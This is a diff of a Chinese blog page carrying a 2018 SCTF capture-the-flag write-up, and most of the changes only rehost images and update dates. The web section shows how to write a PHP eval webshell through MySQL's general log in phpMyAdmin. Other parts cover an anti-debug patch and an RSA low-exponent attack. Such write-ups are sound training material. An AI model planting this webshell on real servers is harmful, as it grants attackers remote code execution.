@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-06-20 22:40</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:10'>2018-06-20 22:40</time>
         
     </div>
     <div class="article-meta">
@@ -777,11 +779,11 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="sctf"><a href="#sctf" class="headerlink" title="sctf"></a>sctf</h1><p>被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201806202236_554.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202236_554.png" alt=""></p>
 <p>[TOC]</p>
 <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="https://i.imgur.com/yPJvv6u.png" alt="SPA图示"><br><img src="https://i.imgur.com/ogzPrtK.png" alt=""></p>
 <p>SCTF{0110111010}</p>
-<h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p>
+<h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p>
 <p><img src="" alt="Uploading file..._wk2cyf491"></p>
 <h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>logicdata拖进Logic里面,分析嗅探得到的波形图</p>
 <p><img src="https://i.imgur.com/fvQUPGz.png" alt=""></p>
@@ -790,7 +792,7 @@
 <h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>使用硕思闪客精灵 反编译flash</p>
 <p>在动作一栏寻找得到一段会话</p>
 <p>得到</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201806202141_189.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202141_189.png" alt=""></p>
 <p>U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9</p>
 <p>base64解码</p>
 <p>SYC{F3iZhai_ku4ile_T111}</p>
@@ -800,7 +802,7 @@
 <h3 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h3><p>参照了网上的文章利用日志的方法写入shell</p>
 <p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接</p>
 <p>首先查看本地的写shell地址</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201806202056_350.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202056_350.png" alt=""></p>
 <p>SET global general_log_file=’D:/phpStu/WWW/shell.php’;</p>
 <p>select “&lt;?php @eval($_POST[‘shell’]);?&gt;”; </p>
 <p><img src="http://oxskavewj.bkt.clouddn.com/3nahv80ilqe61q1enu4zprhu59.png" alt=""></p>
@@ -810,10 +812,10 @@
 <p><img src="http://oxskavewj.bkt.clouddn.com/cgb8jdo2whkqex0ndrl65y2tq3.png" alt=""></p>
 <p>flag:sctf{5cr1Pt_In_ScrIpT!!}</p>
 <h3 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h3><p>题目要求是让白球吃到13个黄色方块得到13分，但是一共只有12个能吃<br>使用相关调试软件发现游戏会闪退，判断有反调试<br>根据suctf的一道题目</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201806202212_643.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202212_643.png" alt=""></p>
 <p>分析Cheat Engine_Data\Managed下的Assembly-CSharp.dll文件，反调试都在这个dll文件下完成<br>发现了这些东西</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_821.png" alt=""></p>
-<p>交叉分析找到反调试函数然后直接patch<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_393.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_208.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_821.png" alt=""></p>
+<p>交叉分析找到反调试函数然后直接patch<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_393.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_208.png" alt=""></p>
 <h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>低解密指数攻击</p>
 <pre><code class="pp">import gmpy2
 import time
@@ -884,7 +886,7 @@ print n
     <p><span>文章字数:</span><span class="post-count">779</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-06-20, 22:40:40</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:10</p>
     <span>原始链接:</span><a class="post-url" href="/archives/f4e3f3ec/" title="2018SCTF-wp">http://mang0.me/archives/f4e3f3ec/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
